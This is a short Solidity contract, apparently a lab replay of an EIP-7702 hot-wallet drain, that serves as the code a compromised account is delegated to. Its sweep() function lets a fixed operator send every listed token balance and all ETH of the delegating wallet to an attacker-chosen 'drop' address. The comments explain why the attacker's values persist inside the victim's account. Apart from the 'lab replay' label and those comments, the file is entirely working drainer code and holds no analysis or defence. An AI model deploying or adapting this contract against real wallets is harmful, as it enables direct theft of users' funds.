// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Lab replay of the 2026-10-29 Binance 14 drain: the code an EOA was delegated to via EIP-7702.
/// @dev Once a hot wallet's code is 0xef0100‖address(this), calling the wallet runs sweep() with
///      address(this) == the wallet. The immutables live in this bytecode, so they keep the attacker's
///      values no matter whose account the code runs in.
contract Sweeper7702 {
    address public immutable operator;
    address payable public immutable drop;

    constructor(address _operator, address payable _drop) {
        operator = _operator;
        drop = _drop;
    }

    /// @notice Sends every listed token balance and all ETH of the delegating account to `drop`.
    function sweep(address[] calldata _tokens) external {
        require(msg.sender == operator, "not operator");
        for (uint256 i; i < _tokens.length; i++) {
            IERC20 t = IERC20(_tokens[i]);
            t.transfer(drop, t.balanceOf(address(this)));
        }
        (bool ok,) = drop.call{value: address(this).balance}("");
        require(ok, "eth");
    }

    receive() external payable {}
}
